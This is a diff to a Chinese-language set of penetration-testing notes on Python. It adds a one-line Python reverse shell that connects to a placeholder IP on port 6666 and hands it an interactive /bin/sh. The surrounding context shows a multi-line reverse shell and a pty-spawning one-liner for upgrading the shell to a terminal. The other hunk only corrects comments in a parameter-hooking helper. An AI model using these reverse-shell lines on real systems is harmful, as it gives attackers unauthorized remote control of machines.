@@ -43,6 +43,12 @@ os.dup2(s.fileno(),2)
 p=subprocess.call(["/bin/sh","-i"])
 ```
 
+单行版本：
+
+```
+IP="x.x.x.x";PORT=6666;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(( IP , PORT ));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])
+```
+
 ## 获得一个tty
 
     python -c 'import pty; pty.spawn("/bin/sh")'
@@ -68,8 +74,8 @@ def function_hook_parameter(oldfunc, parameter_index, parameter_name, parameter_
     def newfunc(*args, **kwargs):  # args是参数列表list，kwargs是带有名称keyword的参数dict
         newargs = list(args)
         if len(args) >= parameter_index:  # 如果这个参数被直接传入，那么肯定其前面的参数都是无名称的参数，args的长度肯定长于其所在的位置
-            newargs[parameter_index - 1] = parameter_value  # 第3个参数在list的下表是2
-        else:  # 如果不是直接传入，那么就在kwargs中 或者可选参数不存在这个参数，强制更新掉kwargs即可
+            newargs[parameter_index - 1] = parameter_value  # 第3个参数在list的下标是2
+        else:  # 如果不是直接传入，那么就在kwargs中 或者传入的可选参数中没有这个参数，直接设置kwargs即可
             kwargs[parameter_name] = parameter_value
         return real_func(*newargs, **kwargs)
     return newfunc
